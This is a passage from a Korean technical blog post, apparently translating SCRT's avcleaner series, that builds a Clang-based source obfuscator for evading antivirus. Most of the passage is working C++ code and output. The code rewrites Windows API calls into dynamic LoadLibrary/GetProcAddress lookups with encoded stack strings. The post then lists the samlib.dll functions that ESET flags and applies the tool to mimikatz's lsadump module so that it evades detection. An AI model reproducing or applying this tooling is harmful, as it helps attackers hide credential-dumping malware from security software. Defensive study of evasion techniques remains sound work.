class="hljs-string">&quot;-fdelayed-template-parsing&quot;</span> <span class="hljs-string">&quot;-fobjc-runtime=gcc&quot;</span> <span class="hljs-string">&quot;-fcxx-exceptions&quot;</span> <span class="hljs-string">&quot;-fexceptions&quot;</span> <span class="hljs-string">&quot;-fseh-exceptions&quot;</span> <span class="hljs-string">&quot;-fdiagnostics-show-option&quot;</span> <span class="hljs-string">&quot;-fcolor-diagnostics&quot;</span> <span class="hljs-string">&quot;-x&quot;</span> <span class="hljs-string">&quot;c++&quot;</span></code></pre><pre><code class="hljs bash">bash clang-astdump.sh <span class="hljs-built_in">test</span>/messagebox_simple.c &gt; <span class="hljs-built_in">test</span>/messagebox_simple.c.ast</code></pre><p><img src="/2020/12/13/idioth/av_evasion_part2/3.png"></p><p>MessageBoxA API를 호출하는 간단한 애플리케이션의 Clang 추상 구문 트리</p><p>CallExpr 유형의 AST 노드를 찾으면 소스 코드에서의 함수 호출을 찾을 수 있다. 위 사진에 나와있는 것처럼 실제 호출되는 함수 이름은 하위 노드 중 하나에 지정되어 있으므로 나중에 접근할 수 있어야 한다.</p><h3 id="특정-API의-함수-호출-찾기"><a href="#특정-API의-함수-호출-찾기" class="headerlink" title="특정 API의 함수 호출 찾기"></a>특정 API의 함수 호출 찾기</h3><p><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>는 특정 함수에 대한 모든 함수 호출을 열거하는데 필요하다. 우선 이전 글에서 사용된 것보다 더 복잡하므로 이 matcher에 맞는 구문을 얻는 것이 중요하다. 적합한 것을 찾기 위해서 소스 코드에서 custom query를 실행할 수 있는 interactive tool인 <code>clang-query</code>를 사용했다. 흥미롭게도 이것은 libTooling 기반이고 이 글에서 보여준 어떤 것보다 훨씬 강력하다.</p><pre><code class="hljs bash">clang-query&gt; match callExpr(callee(functionDecl(hasName(<span class="hljs-string">&quot;MessageBoxA&quot;</span>))))Match <span class="hljs-comment">#1:</span>/Users/vladimir/dev/scrt/avcleaner/<span class="hljs-built_in">test</span>/messagebox_simple.c:6:5: note: <span class="hljs-string">&quot;root&quot;</span> binds here    MessageBoxA(NULL, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~1 match.clang-query&gt;</code></pre><p>시행착오와 명령 줄 완성(tab completion)으로 빠르게 작업 솔루션에 접근할 수 있었다. matcher가 잘 동작하는 것을 확인했으니 이전 글에서 수행한 것과 같은 새로운 <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>를 생성할 수 있다. <code>clang-query</code>를 사용하여 수행한 것을 C++ 재현하는 것이다.</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiCallConsumer</span> :</span> <span class="hljs-keyword">public</span> clang::ASTConsumer &#123;<span class="hljs-keyword">public</span>:    ApiCallConsumer(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiName, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> TypeDef, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Library)            : _ApiName(<span class="hljs-built_in">std</span>::move(ApiName)), _TypeDef(<span class="hljs-built_in">std</span>::move(TypeDef)), _Library(<span class="hljs-built_in">std</span>::move(Library)) &#123;&#125;    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleTranslationUnit</span><span class="hljs-params">(clang::ASTContext &amp;Context)</span> <span class="hljs-keyword">override</span> </span>&#123;                <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::ast_matchers;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> AVObfuscator;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;[ApiCallObfuscation] Registering ASTMatcher for &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;        MatchFinder Finder;        <span class="hljs-function">ApiMatchHandler <span class="hljs-title">Handler</span><span class="hljs-params">(&amp;ASTRewriter, _ApiName, _TypeDef, _Library)</span></span>;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> Matcher = callExpr(callee(functionDecl(hasName(_ApiName)))).bind(<span class="hljs-string">&quot;callExpr&quot;</span>);        Finder.addMatcher(Matcher, &amp;Handler);        Finder.matchAST(Context);    &#125;<span class="hljs-keyword">private</span>:    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _ApiName;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _TypeDef;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _Library;&#125;;</code></pre><p>중요한 구현 세부 사항은 많은 다른 함수들에 적용할 수 있는 가능성을 제공하는 것이고 최종적인 목표는 각 수정된 API 함수에 <code>LoadLibrary/GetProcAddress</code>를 삽입하는 것이므로 함수 프로토타입과 DLL 이름을 제공해야 한다.</p><p>그렇게 하면 수정할 API만큼 많은 <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumers</a>를 등록할 수 있다. 이 <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>의 인스턴스화는 <a href="https://clang.llvm.org/doxygen/classclang_1_1FrontendAction.html">ASTFrontendAction</a>에서 수행되야만 한다:</p><p><img src="/2020/12/13/idioth/av_evasion_part2/4.png"></p><p><code>main.cpp</code>의 주요 변경점.</p><p>이것은 이전 글에서 작업한 기존 코드에 대한 유일한 변경점이다. 우리가 추가할 코드들은 <code>ApiMatchHandelr.cpp</code>를 만드는 것부터 시작한다.</p><p>matcher는 콜백 함수와 함께 제공되므로 다음 하나를 제공하자.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ApiMatchHandler::run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> </span>&#123;    llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Found &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *CallExpression = Result.Nodes.getNodeAs&lt;clang::CallExpr&gt;(<span class="hljs-string">&quot;callExpr&quot;</span>);    handleCallExpr(CallExpression, Result.Context);&#125;</code></pre><p>섹션의 시작 부분에서 리스트로 분리된 작업들은 아래 메소드를 통해 코드로 바꿀 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span></span>;<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span></span>;<span class="hljs-keyword">bool</span>addGetProcAddress(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,                    <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName);<span class="hljs-function">clang::SourceRange <span class="hljs-title">findInjectionSpot</span><span class="hljs-params">(clang::ASTContext *<span class="hljs-keyword">const</span> Context, clang::ast_type_traits::DynTypedNode Parent,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> clang::CallExpr &amp;Literal, <span class="hljs-keyword">uint64_t</span> Iterations)</span></span>;</code></pre><h3 id="함수-호출-대체"><a href="#함수-호출-대체" class="headerlink" title="함수 호출 대체"></a>함수 호출 대체</h3><p>이것은 가장 사소한 부분이다. 목표는 AST의 <code>MessageBoxA</code>를 무작위 식별자로 대체하는 것이다. 이러한 무작위 변수 초기화는 다음 섹션에서 수행된다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span> </span>&#123;    <span class="hljs-comment">// generate a random variable name</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Replacement = Utils::translateStringToIdentifier(_ApiName);    <span class="hljs-comment">// inject Run-time dynamic linking</span>    <span class="hljs-keyword">if</span> (!addGetProcAddress(CallExpression, pContext, Replacement, _ApiName))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-comment">// MessageBoxA -&gt; random identifier generated above</span>    <span class="hljs-keyword">return</span> replaceIdentifier(CallExpression, _ApiName, Replacement);&#125;</code></pre><p><a href="https://clang.llvm.org/doxygen/Rewriter_8h_source.html#l00164">ReplaceText</a> Clagn API는 함수 식별자의 이름을 변경하는 데 사용된다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span> </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;ASTRewriter-&gt;ReplaceText(CallExpression-&gt;getBeginLoc(), ApiName.length(), NewIdentifier);&#125;</code></pre><h3 id="LoadLibrary-GetProcAddress-삽입"><a href="#LoadLibrary-GetProcAddress-삽입" class="headerlink" title="LoadLibrary/GetProcAddress 삽입"></a>LoadLibrary/GetProcAddress 삽입</h3><p>우리가 추가하고자 하는 API에 Run-time dynamic linking을 추가하는 과정은 다음과 같다:</p><ul><li><p>translation unit의 상단 혹은 enclosing 함수 안에 API 프로토타입을 추가해라. 쉽게 하기 위해 우리는 후자를 선택하지만 동일한 함수에서 API를 여러 번 호출할 경우 이미 추가되었는지 확인할 필요가 있다.</p></li><li><p>아래 라인을 추가해라</p><p>  <code>HANDLE &lt;random identifier&gt; LoadLibrary(&lt;library name&gt;);</code></p></li><li><p><code>GetProcAddress</code> 호출을 추가해라</p></li></ul><p>물론 이 작업을 하면서 문자열 리터럴을 삽입하지 않기 위해 각 문자열을 스택 문자열로 작성해야 한다. 이것은 코드를 읽기 지루하게 만들지만 복잡하진 않다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::addGetProcAddress</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName)</span> </span>&#123;    SourceRange EnclosingFunctionRange = findInjectionSpot(pContext, clang::ast_type_traits::DynTypedNode(),                                                           *pCallExpression, <span class="hljs-number">0</span>);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">stringstream</span> Result;    <span class="hljs-comment">// add function prototype if not already added</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">std</span>::find(TypedefAdded.begin(), TypedefAdded.end(), pCallExpression-&gt;getDirectCallee()) == TypedefAdded.end()) &#123;        Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; _TypeDef &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    &#125;    <span class="hljs-comment">// add LoadLibrary with obfuscated strings</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryVariable = Utils::translateStringToIdentifier(_Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryString = Utils::generateVariableDeclaration(LoadLibraryVariable, _Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryHandleIdentifier = Utils::translateStringToIdentifier(<span class="hljs-string">&quot;hHandle_&quot;</span>+_Library);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; LoadLibraryString &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\tHANDLE &quot;</span> &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot; = LoadLibrary(&quot;</span> &lt;&lt; LoadLibraryVariable &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    <span class="hljs-comment">// add GetProcAddress with obfuscated string: TypeDef NewIdentifier = (TypeDef) GetProcAddress(handleIdentifier, ApiName)</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameIdentifier = Utils::translateStringToIdentifier(ApiName);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameDecl = Utils::generateVariableDeclaration(ApiNameIdentifier, ApiName);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; ApiNameDecl &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\t_ &quot;</span>&lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; NewIdentifier &lt;&lt; <span class="hljs-string">&quot; = (_&quot;</span> &lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot;) GetProcAddress(&quot;</span>           &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; ApiNameIdentifier &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    TypedefAdded.push_back(pCallExpression-&gt;getDirectCallee());    <span class="hljs-comment">// add everything at the beginning of the function.</span>    <span class="hljs-keyword">return</span> !(ASTRewriter-&gt;InsertText(EnclosingFunctionRange.getBegin(), Result.str()));&#125;</code></pre><h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><pre><code class="hljs cpp">git clone https:<span class="hljs-comment">//github.com/scrt/avcleaner</span>mkdir avcleaner/CMakeBuild &amp;&amp; cd avcleaner/CMakeBuildcmake ..makecd ..</code></pre><p>전부 잘 동작하는지 테스트하기 위해 아래 테스트 파일을 사용하자.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Another test&quot;</span>, <span class="hljs-string">&quot;Another something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>obfuscator 실행!</p><pre><code class="hljs cpp">./CMakeBuild/avcleaner.bin test/messagebox_simple.c --strings=<span class="hljs-literal">true</span> --api=<span class="hljs-literal">true</span> -- -D _WIN64 -D _UNICODE -D UNICODE -D _WINSOCK_DEPRECATED_NO_WARNINGS\ -I /usr/local/Cellar/llvm/<span class="hljs-number">9.0</span><span class="hljs-number">.1</span>\ -I /Users/vladimir/dev/scrt/avcleaner/Include/msvc<span class="hljs-number">-14.15</span><span class="hljs-number">.26726</span>-include\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/ucrt\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/shared\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/um\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/winrt -w -fdebug-compilation-dir -fno-use-cxa-atexit -fms-extensions -fms-compatibility -fms-compatibility-version=<span class="hljs-number">19.15</span><span class="hljs-number">.26726</span> -<span class="hljs-built_in">std</span>=c++<span class="hljs-number">14</span> -fdelayed-<span class="hljs-keyword">template</span>-parsing -fobjc-runtime=gcc -fcxx-exceptions -fexceptions -fdiagnostics-show-option -fcolor-diagnostics -x c++ -ferror-limit=<span class="hljs-number">1900</span> -target x86_64-pc-windows-msvc19<span class="hljs-number">.15</span><span class="hljs-number">.26726</span> -fsyntax-only -disable-<span class="hljs-built_in">free</span> -disable-llvm-verifier -discard-value-names -dwarf-column-info -debugger-tuning=gdb -momit-leaf-frame-pointer -v</code></pre><p>결과 확인!</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Someth_lNGj92poubUG[] = &#123;<span class="hljs-string">&#x27;\x53&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x69&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_UP7KUo4Sa8LC[] = &#123;<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_ACsNhmIcS1tA[] = &#123;<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x69&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</span></span>;    TCHAR hid_User___Bhk5rL2239Kc[] = &#123;<span class="hljs-string">&#x27;\x55&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x33&#x27;</span>,<span class="hljs-string">&#x27;\x32&#x27;</span>,<span class="hljs-string">&#x27;\x2e&#x27;</span>,<span class="hljs-string">&#x27;\x64&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hid_hHandl_PFP2JD4HjR8w = LoadLibrary(hid_User___Bhk5rL2239Kc);    TCHAR hid_Messag_drqxgJLSrxfT[] = &#123;<span class="hljs-string">&#x27;\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x61&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x42&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x78&#x27;</span>,<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA hid_Messag_1W70P1kc8OJv = (_MessageBoxA) GetProcAddress(hid_hHandl_PFP2JD4HjR8w, hid_Messag_drqxgJLSrxfT);    TCHAR hid_User___EMmJBb201EuJ[] = &#123;<span class="hljs-string">&#x27;\x55&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x33&#x27;</span>,<span class="hljs-string">&#x27;\x32&#x27;</span>,<span class="hljs-string">&#x27;\x2e&#x27;</span>,<span class="hljs-string">&#x27;\x64&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hid_hHandl_vU1riOrVWM8g = LoadLibrary(hid_User___EMmJBb201EuJ);    TCHAR hid_Messag_GoaJMFscXsdw[] = &#123;<span class="hljs-string">&#x27;\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x61&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x42&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x78&#x27;</span>,<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA hid_Messag_6nzSLR0dttUn = (_MessageBoxA) GetProcAddress(hid_hHandl_vU1riOrVWM8g, hid_Messag_GoaJMFscXsdw);hid_Messag_1W70P1kc8OJv(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, hid_Someth_lNGj92poubUG, MB_OK);    hid_Messag_6nzSLR0dttUn(<span class="hljs-literal">NULL</span>, hid_Anothe_UP7KUo4Sa8LC, hid_Anothe_ACsNhmIcS1tA, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>볼 수 있듯이 문자열 난독화와 API 난독화 패스의 조합은 상당히 강력하다. <code>Test</code> 문자열은 작은 문자열은 무시하는 것으로 결정했기 때문에 남아있다. 그 후 난독화 소스 코드는 빌드할 수 있다.</p><pre><code class="hljs cpp">$ cp test/messagebox_simple.c.patch /tmp/test.c$ x86_64-w64-mingw32-gcc /tmp/test.c -o /tmp/toto.exe</code></pre><p>윈도우10 가상 머신에서 테스트 결과 원래 기능이 계속 작동하는 것으로 보인다. 더 중요한 것은 난독화된 바이너리에 <code>MessageBox</code> 문자열이 없다.</p><pre><code class="hljs cpp">$ rabin2 -zz /tmp/toto.exe | grep MessageBox | wc -l  <span class="hljs-number">0</span></code></pre><h3 id="Generalisation"><a href="#Generalisation" class="headerlink" title="Generalisation"></a>Generalisation</h3><p>안티바이러스 ESET Nod32 관련해서 우리는 <code>samlib.dll</code>과 관련된 API imports 중 특히 아래에 있는 API들을 숨기는 것이 중요하다는 것을 발견했다.</p><ul><li>SamConnect</li><li>SamConnectWithCreds</li><li>SamEnumerateDomainInSamServer</li><li>SamLookupDomainInSamServer</li><li>SamOpenDomain</li><li>SamOpenUser</li><li>SamOpenGroup</li><li>SamOpenAlias</li><li>SamQueryInformationUser</li><li>SamSetInformationUser</li><li>SamiChangePasswordUser</li><li>SamGetGroupsForUser</li><li>SamGetAliasMembership</li><li>SamGetMembersInGroup</li><li>SamGetMembersInAlias</li><li>SamEnumerateUsersInDomain</li><li>SamEnumerateGroupsInDomain</li><li>SamEnumerateAliasesInDomain</li><li>SamLookupNamesInDomain</li><li>SamLookupIdsInDomain</li><li>SamRidToSid</li><li>SamCloseHandle</li><li>SamFreeMemory</li></ul><p>이러한 함수들은 AV 엔진 어디에서도 블랙리스트에 있지 않지만 내부 탐지 신뢰 점수를 높인다. 이러한 함수에 <code>ApiCallConsumer</code>를 등록해야 하므로 이름과 함수 프로토타입이 필요하다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">static</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; ApiToHide_samlib = &#123;    &#123;<span class="hljs-string">&quot;SamConnect&quot;</span>,                     <span class="hljs-string">&quot;typedef NTSTATUS (__stdcall* _SamEnumerateDomainsInSamServer)(SAMPR_HANDLE ServerHandle, DWORD * EnumerationContext, PSAMPR_RID_ENUMERATION* Buffer, DWORD PreferedMaximumLength,DWORD * CountReturned);&quot;</span>&#125;,    &#123;<span class="hljs-string">&quot;SamConnectWithCreds&quot;</span>,            <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnect)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, BOOLEAN Trusted);&quot;</span>&#125;,    &#123;<span class="hljs-string">&quot;SamEnumerateDomainsInSamServer&quot;</span>, <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnectWithCreds)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, LSA_OBJECT_ATTRIBUTES * ObjectAttributes, RPC_AUTH_IDENTITY_HANDLE AuthIdentity, PWSTR ServerPrincName, ULONG * unk0);&quot;</span>&#125;,    ...&#125;</code></pre><p>그 후 이러한 컬렉션을 반복하고 각 컬렉션을 처리하기 위해 <code>main.cpp</code>를 업데이트한다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> <span class="hljs-keyword">const</span>&amp; el: ApiToHide_samlib)&#123;    <span class="hljs-keyword">auto</span> Cons = <span class="hljs-built_in">std</span>::make_unique&lt;ApiCallConsumer*&gt;(<span class="hljs-keyword">new</span> ApiCallConsumer(el.first, el.second,                                                                        <span class="hljs-string">&quot;samlib.dll&quot;</span>));    consumers.push_back(*Cons);&#125;</code></pre><p>여기서 <code>std::make_unique</code>는 이 반복문에서 힙에 있는 객체를 인스턴스화할 수 있기에 중요하고 나중에 이러한 객체를 수동으로 쉽게 해제할 수 있다. 이것은 더 이상 사용하지 않을 때 자동으로 해제될 것이다.</p><p>마지막으로 mimikatz, 특히 <code>kuhl_m_lsadump.c</code>로 난독화를 테스트할 수 있다.</p><pre><code class="hljs bash">bash run_example_mimikatz.sh <span class="hljs-built_in">test</span>/kuhl_m_lsadump.c</code></pre><p>이것은 흥미로운 결과를 만든다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/5.png"></p><p><code>samlib.dll</code>에서 가져온 API를 위한 Run-time dynamic linking</p><p>실제 함수 호출은 완벽하게 수정되었다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/6.png"></p><p><code>samlib.dll</code>에서 가져온 함수 호출들은 완벽하게 수정되었다.</p><p><code>PRINT_ERROR</code> 매크로 내부의 문자열은 <code>do&#123;&#125;while(0)</code>을 통해 매크로를 사용하여 난독화 되지 않았다. obfuscator의 버그를 찾는데 <code>mimikatz</code>보다 좋은 프로젝트를 찾기 못했다.</p><h2 id="개선사항"><a href="#개선사항" class="headerlink" title="개선사항"></a>개선사항</h2><p>이 부분은 여러분을 위해 남겨진 작업들이다 🙂</p><h3 id="More-stealth"><a href="#More-stealth" class="headerlink" title="More stealth"></a>More stealth</h3><p>run-time dynamic linking을 수행하기 위해 실제로 API 